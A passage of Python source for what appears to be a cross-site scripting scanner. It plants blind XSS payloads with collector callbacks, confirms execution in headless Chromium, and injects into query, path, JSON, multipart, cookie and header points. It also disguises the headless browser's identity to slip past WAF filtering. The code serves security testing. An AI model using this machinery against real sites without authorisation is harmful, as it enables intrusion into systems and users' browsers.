        if not self.enabled:
            return 0
        with self.scanner.lock:
            pending = {tag: dict(meta)
                       for tag, meta in self.scanner.blind_map.items()}
        if not pending:
            return 0

        found = 0
        for kind, path in self.sources:
            text = self._new_text(path)
            if not text:
                continue
            low = text.lower()
            for tag, meta in pending.items():
                with self._lk:
                    if (tag, kind) in self.seen:
                        continue
                label = f"{BLIND_LABEL}{tag}".lower()
                if label not in low:
                    continue
                with self._lk:
                    if (tag, kind) in self.seen:
                        continue
                    self.seen.add((tag, kind))
                self._report(kind, path, tag, meta, text, low, label)
                found += 1
        return found

    def _report(self, kind, path, tag, meta, text, low, label):
        line = next((l.strip() for l in text.splitlines()
                     if label in l.lower()), "")
        with self.scanner.lock:
            entry = self.scanner.blind_map.get(tag)
            if entry is not None:
                entry.setdefault("callback", []).append(kind)
        self.scanner.add(Finding(
            kind=f"{kind} request received, blind injection confirmed",
            url=meta.get("url", "?"),
            param=meta.get("param", "?"),
            location=meta.get("kind", "?"),
            method=meta.get("method", "GET"),
            context=meta.get("host", f"{BLIND_LABEL}{tag}"),
            payload=f"planté le {meta.get('time', '?')}",
            evidence=f"{line[:220]}   [{path}]" if line
                     else f"token trouvé dans {path}",
            poc=meta.get("url", ""),
            confidence="oob", verified=True,
            verified_note=f"callback {kind} reçu sur votre collecteur"))


class _StopURL(Exception):
    """Raised to abort the remaining tests on a URL once enough findings are
    browser-confirmed (see --confirm-x)."""


class Confirmer:
    """
    Headless-browser confirmation of a finding (Playwright / Chromium).

    A finding from the HTTP layer means "the payload came back unencoded" - a
    strong signal, not proof. This loads the reproduction in a real browser and
    watches for the payload's alert()/confirm()/prompt() actually firing; on a
    hit the finding is flagged CONFIRMED.

    Playwright's sync API is bound to one thread, so ALL browser calls run on a
    single dedicated worker thread fed by a queue; verify() (called from any
    scan thread) enqueues a request and blocks on its result. One page at a
    time - cheap here because confirmation only runs on findings, not on tests.

    Auto-confirmable vectors: reflected GET, path, DOM (hash/fragment), stored
    (re-fetch), header, cookie, GET forms, and POST bodies that a form can
    carry -- urlencoded fields and multipart parts, replayed with a
    self-submitting form (_post). JSON bodies are the exception and stay
    unverified: no HTML form can send application/json, so there is no
    reproduction to run, and why_not() says so on the finding rather than
    leaving a missing badge to be read as "it does not execute".

    This list was measured, not assumed. Three of these vectors were in the
    docstring and in none of the code: cookie findings fell through to the
    poc test and returned None; POST bodies had no reproduction at all; and
    GET forms had one whose URL carried the injected parameter twice, so the
    browser read the first, clean occurrence and nothing fired.

    Blind (-b) findings take a second path (verify_blind). A planted payload is
    inert until something renders it: the HTTP plant only *stores* it. On a
    reflected point the payload comes straight back in the same response, so
    replaying it in Chromium is what makes the callback leave - watching
    page.on("request") for traffic towards the collector proves the payload
    executed even when the collector is unreachable from this host.
    """

    _DIALOG_RE = re.compile(r"(?:alert|prompt|confirm)\s*\(\s*(?:'([^']*)'|"
                            r"\"([^\"]*)\"|`([^`]*)`|([0-9]+))")

    def __init__(self, args, rep: Reporter, resolver=None):
        self.args = args
        self.rep = rep
        self.enabled = bool(getattr(args, "confirm", False))
        self.timeout = getattr(args, "confirm_timeout", 8.0)
        self._q: "queue.Queue" = queue.Queue()
        # One browser, one page at a time: scan threads take turns rather than
        # piling onto the queue. Each waiter's timeout then covers its own job
        # instead of everyone else's too - queued behind four other findings, a
        # confirmation used to expire while it was still waiting its turn and
        # come back as "not confirmed".
        self._turn = threading.Lock()
        self._ready = threading.Event()
        self._ok = False
        self._thread = None
        # Only what the user actually asked for. Forcing DEFAULT_UA here made
        # headless Chromium claim to be Chrome 124 on macOS while sending the
        # client hints of Chromium 141 on Linux - a contradiction a WAF spots
        # instantly. The browser's own identity, minus the "Headless" giveaway,
        # is both honest and self-consistent; see _run().
        self.base_headers = {}
        self.browser_ua = DEFAULT_UA
        self.browser_hints: dict = {}
        for h in getattr(args, "header", []) or []:
            if ":" in h:
                k, _, v = h.partition(":")
                self.base_headers[k.strip()] = v.strip()
        # Resolved per URL when the scanner hands us one, so an auth file and a
        # -r capture reach the browser the same way they reach the HTTP layer.
        self._resolver = resolver

    def headers_for(self, url: str) -> dict:
        if self._resolver is None:
            return dict(self.base_headers)
        try:
            return dict(self._resolver(url))
        except Exception:
            return dict(self.base_headers)

        # blind (-b): the collector domain. Each tag gets its own hostname
        # (xss-<tag>.<domain>), which is what a callback is recognised by.
        self.blind = (getattr(args, "blind", "") or "").strip()
        self.blind_host = blind_collector(self.blind)[1] if self.blind else ""
        self.blind_confirm = (self.enabled and bool(self.blind_host)
                              and not getattr(args, "no_blind_confirm", False))

    # -- lifecycle -----------------------------------------------------------

    def start(self):
        if not self.enabled:
            return
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()
        self._ready.wait(timeout=90)
        if not self._ok:
            self.rep.warn("confirmation désactivée (navigateur indisponible)")

    def stop(self):
        if self._thread and self._ok:
            self._q.put(None)
            self._thread.join(timeout=10)

    def _run(self):
        try:
            from playwright.sync_api import sync_playwright
        except Exception:
            self.rep.error("Playwright introuvable - `pip install playwright` puis "
                           "`playwright install chromium` (voir --help). "
                           "Scan poursuivi sans confirmation.")
            self._ready.set()
            return
        try:
            with sync_playwright() as pw:
                launch = {"headless": True,
                          "args": ["--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage"]}
                if self.args.proxy:
                    launch["proxy"] = {"server": self.args.proxy}
                browser = pw.chromium.launch(**launch)
                # Chromium announces itself as "HeadlessChrome/<version>",
                # which is filtered as readily as a missing User-Agent.
                # Dropping that one word leaves the platform and the version
                # truthful, so the string still agrees with the client hints
                # Chromium sends on its own - which a hand-written UA does not.
                try:
                    probe = browser.new_context()
                    self.browser_ua = probe.new_page().evaluate(
                        "navigator.userAgent").replace("HeadlessChrome/",
                                                       "Chrome/")
                    probe.close()
                    # Chromium also announces itself in sec-ch-ua, which it
                    # builds itself and which still said "HeadlessChrome" after
                    # the User-Agent was cleaned - a contradiction between the
                    # two is worse than either giveaway alone. Rebuild the
                    # brand list from the version we just read, so both agree.
                    m = re.search(r"Chrome/(\d+)", self.browser_ua)
                    if m:
                        self.browser_hints = {
                            "sec-ch-ua": (f'"Chromium";v="{m.group(1)}", '
                                          f'"Google Chrome";v="{m.group(1)}", '
                                          f'"Not?A_Brand";v="24"')}
                    self.rep.debug(f"browser UA: {self.browser_ua} "
                                   f"| hints: {self.browser_hints}")
                except Exception as e:
                    self.rep.debug(f"browser UA probe failed: {e}")
                self._ok = True
                self._ready.set()
                while True:
                    item = self._q.get()
                    if item is None:
                        break
                    mode, finding, holder, done = item
                    try:
                        holder[0] = (self._verify_blind(browser, finding)
                                     if mode == "blind"
                                     else self._verify(browser, finding))
                    except Exception as e:
                        holder[0] = None
                        self.rep.debug(f"confirm error: {e}")
                    finally:
                        done.set()
                browser.close()
        except Exception as e:
            self.rep.error(f"lancement Playwright échoué: {e}")
            self._ready.set()

    # -- request plumbing ----------------------------------------------------

    def _token(self, finding: Finding):
        m = self._DIALOG_RE.search(finding.payload or "")
        if not m:
            return None
        return next((g for g in m.groups() if g is not None), None)

    def _target(self, finding: Finding):
        """Return (url, extra_headers, cookies, submit) for the reproduction,
        or None when there is nothing the browser can load."""
        loc = (finding.location or "").lower()
        if loc == "header":
            if (finding.param or "").lower() == "cookie":
                jar = []
                for part in (finding.payload or "").split(";"):
                    if "=" in part:
                        n, _, v = part.strip().partition("=")
                        if n:
                            jar.append({"name": n, "value": v, "url": finding.url})
                return finding.url, {}, jar, None
            return finding.url, {finding.param: finding.payload}, [], None
        if loc == "cookie" and finding.param:
            # One cookie carries the payload. This used to fall through to the
            # poc test and return None: the class docstring listed cookies as
            # auto-confirmable while every cookie finding came back
            # unverified, which is indistinguishable from "the payload does
            # not execute".
            name = finding.param.split(" (")[0]
            return (finding.url, {},
                    [{"name": name, "value": finding.payload,
                      "url": finding.url}], None)
        if finding.poc and finding.poc.startswith(("http://", "https://")):
            return finding.poc, {}, [], None
        if (finding.payload or "").startswith(("http://", "https://")):
            # DOM source->sink navigable payload
            return finding.payload, {}, [], None
        if finding.submit:
            return finding.submit["url"], {}, [], finding.submit
        return None

    def why_not(self, finding: Finding) -> str:
        """Why this finding was never handed to the browser, or "" if it was.

        Reported, because a finding with no [CONFIRMED] badge is otherwise
        ambiguous between "the browser ran it and nothing fired" -- evidence
        against -- and "there was nothing to run", which says nothing at all.
        """
        if not self.enabled:
            return ""
        if not self._ok:
            return "headless browser unavailable"
        if self._target(finding) is not None:
            return ""
        if (finding.location or "").lower() == "json":
            return ("no reproduction a browser can issue: an HTML form "
                    "cannot send application/json")
        return "no reproduction a browser can load"

    def verify(self, finding: Finding):
        """True/False if the browser could test it, None if not applicable/off."""
        if not self.enabled or not self._ok:
            return None
        if self._target(finding) is None:
            return None
        holder = [None]
        done = threading.Event()
        with self._turn:
            self._q.put(("dialog", finding, holder, done))
            done.wait(timeout=self.timeout + 15)
        return holder[0]

    def _context(self, browser, headers: dict):
        """One place where the browser's identity is settled, so the dialog
        path and the blind replay can never drift apart."""
        merged = dict(self.browser_hints)
        merged.update(headers)          # -H and planted payloads win
        return browser.new_context(
            ignore_https_errors=True,
            user_agent=merged.pop("User-Agent", self.browser_ua),
            extra_http_headers=merged)

    # A form that builds itself and submits. Written as a script rather than
    # as literal HTML because every value here is a payload: assigning
    # el.name/el.value through the DOM cannot escape into markup, while
    # interpolating the same text into an HTML string could inject anything.
    _POST_PAGE = """<!doctype html><meta charset="utf-8"><body>
<form id="f" method="POST" enctype="%(enctype)s"></form>
<script>
var spec = %(spec)s, f = document.getElementById('f');
f.action = %(action)s;
for (var i = 0; i < spec.length; i++) {
  var p = spec[i], el = document.createElement('input');
  el.name = p.name;
  if (p.filename === null) { el.type = 'hidden'; el.value = p.value; }
  else {
    el.type = 'file';
    var dt = new DataTransfer();
    var raw = Uint8Array.from(atob(p.b64 || ''), function (c) {
      return c.charCodeAt(0); });
    dt.items.add(new File([raw], p.filename, p.ctype ? {type: p.ctype} : {}));
    el.files = dt.files;
  }
  f.appendChild(el);
}
f.submit();
</script></body>"""

    def _post(self, page, url: str, submit: dict):
        """Reproduce a POST by submitting a form the page builds for itself.

        Same-origin on purpose: the page is loaded from the target's own
        origin first, so the cookies the application needs are sent. What this
        proves is that the payload EXECUTES in a browser, which is the finding
        under test. Whether a third-party site could trigger the same POST is
        a separate question -- SameSite, CSRF tokens -- and is not claimed
        here.
        """
        root = urllib.parse.urlsplit(url)
        try:
            page.goto(f"{root.scheme}://{root.netloc}/", wait_until="commit",
                      timeout=int(self.timeout * 1000))
        except Exception as e:
            # about:blank still submits; only same-site cookies are lost.
            self.rep.debug(f"confirm: origin page unreachable ({e})")
        spec = json.dumps([{"name": f["name"], "value": f.get("value", ""),
                            "filename": f.get("filename"),
                            "ctype": f.get("ctype"), "b64": f.get("b64", "")}
                           for f in submit["fields"]])
        html = self._POST_PAGE % {
            "enctype": submit.get("enctype",
                                  "application/x-www-form-urlencoded"),
            # "</script>" inside a payload would end the block early; the
            # escape is JSON-transparent and leaves the value unchanged.
            "spec": spec.replace("</", "<\\/"),
            "action": json.dumps(url)}
        page.set_content(html, wait_until="commit",
                         timeout=int(self.timeout * 1000))

    def _verify(self, browser, finding: Finding) -> bool:
        url, extra, cookies, submit = self._target(finding)
        headers = self.headers_for(url)
        headers.update(extra or {})

        # Cookies travel in the context jar and nowhere else. Chromium builds
        # the Cookie header itself, so one set alongside the jar through
        # extra_http_headers is not reliably the one sent -- and an injected
        # cookie cancelling a session cookie from -r or an auth file looks
        # exactly like a payload that does not fire.
        jar = list(cookies or [])
        have = {c["name"] for c in jar}
        for key in [k for k in list(headers) if k.lower() == "cookie"]:
            for n, v in parse_cookie_header(headers.pop(key)).items():
                if n not in have:
                    jar.append({"name": n, "value": v, "url": url})
                    have.add(n)

        ctx = self._context(browser, headers)
        try:
            if jar:
                try:
                    ctx.add_cookies(jar)
                except Exception as e:
                    # Never silent: a refused cookie means the reproduction
                    # ran without it, and "not confirmed" would be a lie.
                    self.rep.debug(f"confirm: cookies refused ({e}); "
                                   f"reproduction runs without them")
            page = ctx.new_page()
            fired = []
            page.on("dialog", lambda d: (fired.append(d.message), d.dismiss()))
            try:
                if submit:
                    self._post(page, url, submit)
                else:
                    page.goto(url, wait_until="load",
                              timeout=int(self.timeout * 1000))
            except Exception:
                pass  # a dialog can fire mid-load / navigation may be aborted
            try:
                page.wait_for_timeout(min(1500, int(self.timeout * 1000)))
            except Exception:
                pass
            token = self._token(finding)
            self.rep.debug(f"confirm {finding.location} {url} -> dialogs={fired!r} "
                           f"token={token!r}")
            if not fired:
                return False
            if token is None:
                return True
            return any(token == m or token in (m or "") for m in fired)
        finally:
            try:
                ctx.close()
            except Exception:
                pass

    # -- blind (OOB) confirmation --------------------------------------------

    _POST_JS = """({action, fields}) => {
        const f = document.createElement('form');
        f.method = 'POST'; f.action = action;
        for (const k in fields) {
            const i = document.createElement('input');
            i.type = 'hidden'; i.name = k; i.value = fields[k];
            f.appendChild(i);
        }
        (document.body || document.documentElement).appendChild(f);
        f.submit();
    }"""

    def verify_blind(self, finding: Finding):
        """
        Replay the payloads planted at one injection point in the browser.

        Only the payloads the target echoed back are worth replaying: if the
        response never contained the tag, the payload is stored somewhere else
        and re-visiting this URL cannot render it (that is a real blind case and
        only a victim's browser will fire it).

        Returns {ok, plant, url, outcome, reason, blocked, visited, echoed},
        or None when confirmation is off or this is not a blind finding.
        """
        if not self.blind_confirm or not self._ok:
            return None
        if not finding.plants:
            return None
        plants = [p for p in finding.plants if p.get("echoed")]
        if not plants:
            # Nothing came back: the payload is stored elsewhere (or dropped).
            # Replaying this URL cannot render it - say so instead of staying
            # silent, so "no callback" is never mistaken for "not tested".
            return {"ok": False, "plant": None, "url": "", "outcome": "none",
                    "reason": "", "blocked": "", "visited": 0, "echoed": False}
        holder = [None]
        done = threading.Event()
        with self._turn:
            self._q.put(("blind", finding, holder, done))
            done.wait(timeout=(self.timeout + 8) * len(plants) + 30)
        return holder[0]

    def _verify_blind(self, browser, finding: Finding):
        plants = [p for p in (finding.plants or []) if p.get("echoed")]
        blocked, visited, best = "", 0, None
        for plant in plants:
            visited += 1
            out = self._replay(browser, plant)
            if out["outcome"] == "landed":
                return {"ok": True, "plant": plant, "url": out["url"],
                        "outcome": "landed", "reason": "", "blocked": blocked,
                        "visited": visited, "echoed": True}
            if out["outcome"] == "blocked":
                blocked = blocked or out["reason"]
            elif out["outcome"] == "sent" and best is None:
                best = (plant, out)
            # A payload whose request left but never arrived proves execution,
            # yet leaves nothing in the collector's HTTP log - a DNS hit alone
            # is thin material for a report. Keep trying the other shapes for
            # one that actually lands, but don't burn the whole list on it.
            if best is not None and visited >= _BLIND_TRIES_AFTER_SENT:
                break
        if best:
            plant, out = best
            return {"ok": True, "plant": plant, "url": out["url"],
                    "outcome": "sent", "reason": out["reason"],
                    "blocked": blocked, "visited": visited, "echoed": True}
        return {"ok": False, "plant": None, "url": "", "outcome": "none",
                "reason": "", "blocked": blocked, "visited": visited,
                "echoed": True}

    def _callback(self, url: str, tag: str, skip: str = "") -> bool:
        """
        True when this request left towards the collector, not towards the
        target.

        With the tag in the hostname this is an exact comparison. The
        navigation URL carries the whole hook inside its own query string but
        is still addressed to the *target*, so it can never match - which the
        earlier path-based form only just managed, and only because a collector
        and a target rarely share a host (on the DVWA bench they do).
        """
        if not url or url == skip:
            return False
        host = (urllib.parse.urlsplit(url).hostname or "").lower()
        want = f"{BLIND_LABEL}{tag}.{self.blind_host}".lower()
        return bool(host) and (host == want or host.endswith("." + want))

    @staticmethod
    def _failure(req) -> str:
        try:
            return req.failure or ""
        except Exception:
            return ""

    def _jar(self, url: str) -> list:
        """
        Turn a `-H 'Cookie: ...'` into real browser cookies for the replay.

        A session cookie is what gets the browser to the same page the scanner
        saw (DVWA behind a login is the normal case). Chromium accepts a Cookie
        header through extra_http_headers but drops it on some sub-requests, so
        the authoritative copy goes in the jar; the header stays too, harmlessly.
        """
        raw = next((v for k, v in self.headers_for(url).items()
                    if k.lower() == "cookie"), "")
        if not raw:
            return []
        host = urllib.parse.urlsplit(url).hostname or ""
        if not host:
            return []
        jar = []
        for part in raw.split(";"):
            name, _, value = part.strip().partition("=")
            if name:
                jar.append({"name": name, "value": value,
                            "domain": host, "path": "/"})
        return jar

    def _replay(self, browser, plant) -> dict:
        """
        Load one planted payload.

        Returns {url, outcome, reason} where outcome is:
          landed  - the collector answered: the callback is on your server now
          sent    - the browser issued the request but the network refused it
                    (DNS, refused, timeout). The payload ran; a victim on a
                    normal network would reach the collector.
          blocked - the browser refused to issue it at all (CSP). The markup
                    broke out, but nothing left: not a confirmation.
          none    - nothing headed for the collector.

        The distinction matters: request events fire for CSP-blocked requests
        too, so "a request object existed" would confirm a page that called
        nobody - which is what a first pass of this did on a CSP target.
        """
        headers = self.headers_for(plant["url"])
        # -H, or a payload planted in the User-Agent header, still wins here.
        headers.update(plant.get("headers") or {})
        ctx = self._context(browser, headers)
        seen, landed, failed = [], [], []
        ms = int(self.timeout * 1000)
        try:
            jar = self._jar(plant["url"])
            if jar:
                try:
                    ctx.add_cookies(jar)
                except Exception as e:
                    self.rep.debug(f"blind replay cookies rejected: {e}")
            page = ctx.new_page()
            # A payload that pops a dialog would otherwise wedge the page.
            page.on("dialog", lambda d: d.dismiss())
            page.on("request", lambda r: seen.append(r.url))
            page.on("response", lambda r: landed.append(r.url))
            page.on("requestfailed",
                    lambda r: failed.append((r.url, self._failure(r))))

            if plant.get("body") is not None and plant.get("method") == "POST":
                # No navigable URL for a POST body: land on the origin first so
                # the session cookies apply, then submit the same form from it.
                root = urllib.parse.urlsplit(plant["url"])
                try:
                    page.goto(f"{root.scheme}://{root.netloc}/",
                              wait_until="domcontentloaded", timeout=ms)
                except Exception:
                    pass
                try:
                    page.evaluate(self._POST_JS,
                                  {"action": plant["url"], "fields": plant["body"]})
                    page.wait_for_load_state("load", timeout=ms)
                except Exception:
                    pass   # the submit navigates away, destroying the context
            else:
                try:
                    page.goto(plant["url"], wait_until="load", timeout=ms)
                except Exception:
                    pass
            tag, skip = plant["tag"], plant["url"]

            def classify():
                mine = [u for u in seen if self._callback(u, tag, skip)]
                got = next((u for u in landed
                            if self._callback(u, tag, skip)), "")
                stopped = [(u, why) for u, why in failed
                           if self._callback(u, tag, skip)]
                # Only a *network* error means the browser handed the request to
                # the network and the network said no. Every other failure
                # reason is the browser itself refusing - Chromium reports a CSP
                # block as plain "csp", so testing for ERR_BLOCKED_* confirmed a
                # CSP'd page that called nobody. Unknown reasons fall on the
                # refusing side: an unrecognised block must not confirm.
                tried = [(u, why) for u, why in stopped
                         if _NET_FAILURE_RX.match(why or "")]
                refused = [(u, why) for u, why in stopped
                           if not _NET_FAILURE_RX.match(why or "")]
                if got:
                    return {"url": got, "outcome": "landed", "reason": ""}
                if tried:
                    return {"url": tried[0][0], "outcome": "sent",
                            "reason": tried[0][1] or "?"}
                if refused:
                    return {"url": refused[0][0], "outcome": "blocked",
                            "reason": refused[0][1] or "?"}
                if mine:
                    return {"url": mine[0], "outcome": "pending", "reason": ""}
                return {"url": "", "outcome": "none", "reason": ""}

            # Wait for the callback to *complete*, don't sleep a flat 2.5s and
            # tear the context down: resolving an external collector and opening
            # the connection takes longer than that, so the DNS query went out
            # and the HTTP request died with the browser. Poll instead - this
            # returns in milliseconds when the collector answers, and holds on
            # only while a request is genuinely in flight.
            grace = time.monotonic() + 1.5        # nothing issued yet
            deadline = time.monotonic() + max(3.0, self.timeout)
            while time.monotonic() < deadline:
                state = classify()["outcome"]
                if state in ("landed", "sent", "blocked"):
                    break
                if state == "none" and time.monotonic() > grace:
                    break                          # the payload never ran
                try:
                    page.wait_for_timeout(200)
                except Exception:
                    break

            out = classify()
            if out["outcome"] == "pending":
                # issued, neither answered nor failed before we gave up
                out = {"url": out["url"], "outcome": "sent",
                       "reason": "aucune réponse avant expiration"}
            line = (f"blind replay {plant['method']} -> {out['outcome']}"
                    f"{' ' + out['url'] if out['url'] else ''}"
                    f"{' [' + out['reason'] + ']' if out['reason'] else ''}")
            # Anything but silence is worth seeing at -v 1: when a collector
            # logs the DNS lookup and nothing else, Chromium's reason for
            # dropping the request is the whole diagnosis.
            if out["outcome"] == "none":
                self.rep.debug(f"{line} ({len(seen)} req) {plant['url'][:100]}")
            else:
                self.rep.test(line)
            return out
        finally:
            try:
                ctx.close()
            except Exception:
                pass


class Scanner:
    def __init__(self, req: Requester, rep: Reporter, args, status: Status = None,
                 confirmer: "Confirmer" = None):
        self.req = req
        self.rep = rep
        self.args = args
        self.status = status
        self.confirmer = confirmer
        self._tls = threading.local()   # per-URL browser-confirmed counter
        self.sql = SqlWatcher(rep, enabled=not args.no_sql)
        self.findings: list[Finding] = []
        self.blind_map: dict[str, dict] = {}
        self.skipped: list[dict] = []       # targets that never answered
        self.lock = threading.Lock()
        self.tested = 0

    # -- bookkeeping ---------------------------------------------------------

    def add(self, f: Finding):
        # Try to prove execution in a real browser before reporting, so the
        # [CONFIRMED] badge shows on the live line. Only for findings that can
        # actually fire (reflected/DOM/stored/header), never for SQL alerts or
        # planted blind payloads.
        if self.confirmer and f.confidence in ("confirmed", "potential"):
            try:
                if self.confirmer.verify(f) is True:
                    f.verified = True
                    f.verified_note = "alert() déclenchée"
                else:
                    # Say which of the two it is. "No [CONFIRMED] badge" used
                    # to mean either "the browser ran it and nothing fired" or
                    # "the browser was never given anything to run", and those
                    # are opposite facts about the finding.
                    f.unconfirmed = self.confirmer.why_not(f)
            except Exception as e:
                self.rep.debug(f"confirm skipped: {e}")
        elif self.confirmer and f.confidence == "planted" and f.plants:
            self._confirm_blind(f)
        with self.lock:
            self.findings.append(f)
        if self.status:
            self.status.record(f.confidence)
        if f.confidence == "oob":
            self.rep.oob(f)
        elif f.confidence == "alert":
            self.rep.alert(f)
        elif f.confidence == "confirmed":
            self.rep.hit(f)
        elif f.confidence == "planted":
            # nothing to report yet - the collector decides. Trace only.
            self.rep.info(f"planted blind payloads in {f.param} ({f.location}) "
                          f"@ {f.url} [{f.context}]")
        else:
            self.rep.maybe(f)

        # Once enough findings are browser-confirmed on this URL, abort the rest.
        # Only meaningful with --confirm (nothing is ever verified otherwise).
        # An OOB finding is raised from the watcher thread, which is not
        # scanning anything: letting it trip the per-URL budget would abort a
        # counter that belongs to another thread, and raise into the poll loop.
        limit = getattr(self.args, "confirm_x", 0)
        if (f.verified and f.confidence != "oob" and self.args.confirm
                and limit and limit > 0):
            n = getattr(self._tls, "verified", 0) + 1
            self._tls.verified = n
            if n >= limit:
                raise _StopURL(n)

    def _confirm_blind(self, f: Finding):
        """
        Replay the payloads planted at this point in the browser.

        Planting over HTTP stores a payload; it never renders one. On a
        reflected point the injected response comes straight back, so loading it
        in Chromium is what actually fires the payload and sends the callback -
        without this step `--confirm -b` planted, reported, and called nobody.
        """
        try:
            res = self.confirmer.verify_blind(f)
        except Exception as e:
            self.rep.debug(f"blind confirm skipped: {e}")
            return
        if not res:
            return
        if not res["ok"]:
            if not res["echoed"]:
                note = ("jamais renvoyé dans la réponse : rien à rejouer ici, "
                        "seul le rendu côté victime peut le déclencher")
            elif res["blocked"]:
                # The markup DID break out - the browser built the request and
                # then refused to send it. Worth saying: a laxer CSP elsewhere
                # on the site, or a victim page without one, would fire it.
                why = "CSP" if res["blocked"] == "csp" else res["blocked"]
                note = (f"payload sorti du contexte mais requête bloquée par "
                        f"le navigateur ({why}) - aucun callback émis")
            else:
                note = (f"{res['visited']} payload(s) rejoués dans le "
                        f"navigateur, aucun callback")
            f.context = f"{f.context} | {note}"
            return

        plant = res["plant"]
        landed = res["outcome"] == "landed"
        f.confidence = "confirmed"
        f.verified = True
        f.kind = ("Blind XSS (exécuté en navigateur, callback reçu)" if landed
                  else "Blind XSS (exécuté en navigateur, callback émis)")
        f.payload = plant["sent"]
        why = res.get("reason") or "?"
        f.verified_note = (f"le collecteur a répondu à {res['url']}" if landed
                           else f"requête sortante vers {res['url']}, restée "
                                f"sans réponse ({why})")
        f.evidence = (
            f"Chromium a rendu la réponse injectée et a obtenu une réponse de "
            f"{res['url']}" if landed else
            # The reason is the whole diagnosis when only DNS shows up in the
            # collector's log: NAME_NOT_RESOLVED means the record answered
            # nothing usable, CONNECTION_REFUSED means no listener on that port.
            f"Chromium a rendu la réponse injectée et a émis une requête vers "
            f"{res['url']} ; le réseau l'a interrompue ({why}), donc le "
            f"collecteur a pu n'enregistrer que la résolution DNS")
        f.context = (("le callback est arrivé sur " if landed else
                      "la requête est partie vers (à vérifier côté "
                      "collecteur) : ")
                     + blind_authority(self.args.blind, plant["tag"]))
        f.poc = (plant["url"] if plant["method"] == "GET"
                 else f"curl -i -X POST {shlex.quote(plant['url'])} "
                      f"-d {shlex.quote(urllib.parse.urlencode(plant['body'] or {}))}")

    def bump(self):
        with self.lock:
            self.tested += 1

    def _sql_check(self, resp, **kw):
        f = self.sql.check(resp, **kw)
        if f:
            self.add(f)

    # -- request funnel ------------------------------------------------------

    def base_value(self, pt: Point) -> str:
        """
        The value the injection point currently carries.  Payloads are appended
        to it so the request keeps whatever the application expects there
        (an id, a token, a valid option) and still reaches the same code path.
        """
        if pt.path_index is not None:
            segs = path_segments(pt.url)
            return (urllib.parse.unquote(segs[pt.path_index])
                    if pt.path_index < len(segs) else "")
        if pt.inject_name:
            return pt.param or ""
        if pt.parts is not None:
            for p in pt.parts:
                if p.name != pt.param:
                    continue
                if pt.part_filename:
                    return p.filename or ""
                # A file part's value is its bytes. Appending a payload to
                # those would send a corrupted upload and measure the
                # rejection, so the value starts empty there.
                return "" if p.is_file else str(p.value)
            return ""
        if pt.json_path is not None:
            if pt.json_name:
                return pt.json_path.rsplit(".", 1)[-1]
            for path, val, _kind in json_leaves(pt.json_body):
                if path == pt.json_path:
                    return "" if val is None else str(val)
            return ""
        if pt.cookie:
            return (pt.jar or {}).get(pt.cookie, "")
        if pt.header:
            # Per-host, so a payload appended to the User-Agent extends the
            # identity this host is actually being scanned with.
            return self.req.header_for(pt.url, pt.header)
        if pt.data is not None and pt.param in pt.data:
            return pt.data.get(pt.param) or ""
        if pt.param is not None:
            query = urllib.parse.urlsplit(pt.url).query
            for k, v in urllib.parse.parse_qsl(query, keep_blank_values=True):
                if k == pt.param:
                    return v
        return ""

    def compose(self, payload: str, pt: Point) -> str:
        """Concatenate the payload onto the current value (unless --replace).

        A NAME is the exception, and --replace does not reach it. The option
        exists to choose between keeping an input's current VALUE and throwing
        it away, because a value is often validated or looked up and the
        original is what keeps the application on its normal path. A name has
        no such property: whatever is appended or substituted, the field stops
        being the field the application knows, so the choice would change
        nothing about the result and only make one spelling of the payload
        harder to read in the report. Names therefore always keep their
        original as a prefix, so the reflection says which field it came from.
        """
        if pt.part_filename:
            # A filename is a name, so --replace does not reach it either --
            # but the extension is structure, not value: upload handlers gate
            # on it, and a payload appended after it ("a.png<svg...>") is
            # refused by the very code that would otherwise print the name
            # back. The payload goes where a browser would put the rest of the
            # name, between the stem and the extension.
            cur = self.base_value(pt)
            stem, dot, ext = cur.rpartition(".")
            if not dot:
                stem, ext = cur, ""
            return stem + payload + (("." + ext) if ext else "")
        if pt.is_name_point:
            return self.base_value(pt) + payload
        if not self.args.append or is_standalone(payload):
            return payload
        return self.base_value(pt) + payload

    def _place(self, pt: Point, sent: str | None):
        """Work out (target url, body, extra headers) for this injection."""
        if pt.parts is not None:
            attr = ("name" if pt.inject_name
                    else "filename" if pt.part_filename else "value")
            parts = (pt.parts if sent is None
                     else place_in_parts(pt.parts, pt.param, sent, attr))
            return pt.url, MultipartBody(parts, pt.boundary), None
        if sent is None:
            if pt.json_path is not None:
                return pt.url, JsonBody(json.dumps(pt.json_body)), None
            return pt.url, (dict(pt.data) if pt.data else None), None
        if pt.inject_name:
            if pt.method == "POST" and pt.data is not None:
                return pt.url, rename_field(pt.data, pt.param, sent), None
            if pt.data is not None:
                # GET form, same merge as above -- and the renamed field must
                # not leave the old name behind either.
                fields = rename_field(pt.data, pt.param, sent)
                out = rename_query_param(pt.url, pt.param, sent)
                for k, v in fields.items():
                    out = set_query_param(out, k, v)
                return out, None, None
            return rename_query_param(pt.url, pt.param, sent), None, None
        if pt.json_path is not None:
            # Always a STRING, quoted by json.dumps. A number leaf becomes a
            # string the moment it carries a payload -- that is the operator's
            # call, and the only alternative is emitting invalid JSON that no
            # parser would read.
            tree = (json_rename(pt.json_body, pt.json_path, sent)
                    if pt.json_name
                    else json_set(pt.json_body, pt.json_path, sent))
            blob = json.dumps(tree)
            if pt.param is not None:
                # The JSON lives inside a QUERY parameter, not in the body:
                # ?filter={"q":"..."} is as common as a JSON body and the tree
                # logic is identical, only the placement differs.
                return set_query_param(pt.url, pt.param, blob), None, None
            return pt.url, JsonBody(blob), None
        if pt.path_index is not None:
            return set_path_segment(pt.url, pt.path_index, sent), \
                (dict(pt.data) if pt.data else None), None
        if pt.cookie:
            jar = dict(pt.jar or {})
            jar[pt.cookie] = sent
            return (pt.url, (dict(pt.data) if pt.data else None),
                    {"Cookie": build_cookie_header(jar)})
        if pt.header:
            return pt.url, (dict(pt.data) if pt.data else None), {pt.header: sent}
        if pt.param is None:
            return pt.url, (dict(pt.data) if pt.data else None), None
        if pt.method == "POST":
            body = dict(pt.data or {})
            body[pt.param] = sent
            return pt.url, body, None
        if pt.data is not None:
            # GET form: every field travels in the query string, MERGED into
            # whatever the URL already carries rather than appended to it.
            #
            # Appending was the bug: a page reached with ?name=aaa that also
            # contains a form whose field is called name produced
            # ?name=aaa&id=qqqq&name=<payload> -- the parameter twice. It
            # still worked on PHP, which keeps the last occurrence, and that
            # is the whole danger of it: a Servlet keeps the FIRST, so the
            # payload never arrived and the target read as clean, while
            # ASP.NET concatenates both and the payload arrived mangled. One
